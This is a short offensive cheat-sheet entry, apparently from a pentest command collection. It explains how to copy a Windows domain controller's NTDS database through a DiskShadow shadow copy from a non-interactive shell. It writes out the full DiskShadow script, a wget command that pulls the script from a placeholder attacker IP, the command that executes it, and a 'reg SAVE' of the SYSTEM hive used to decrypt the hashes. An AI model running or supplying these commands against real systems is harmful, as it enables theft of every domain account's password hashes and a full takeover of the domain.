---
title: |
  Make NTDS backup by creating a shadow copy
description: |
  If you only have a (non-interactive) shell, creating the NTDS backup can also be done by creating a shadow copy

  DiskShadow script:

  	#for some reason there have to be spaces after each line

  	#Diskshadow script file

  	set verbose on

  	set context persistent nowriters

  	begin backup

  	add volume c: alias systemvolumeshadow

  	create

  	expose %systemvolumeshadow% Z:

  	end backup

  	#End of script
  
  Then download and execute this DiskShadow script:

  	wget http://<IP>/script.dsh -Out script.dsh

  	diskshadow /s script.dsh

  	reg SAVE HKLM\SYSTEM c:\Users\svc_backup\Documents\SYS

command: |
  See commands.
items:
  - Shell
OS:
  - Windows
attack_types:
  - Exploitation
  - Persistence
---
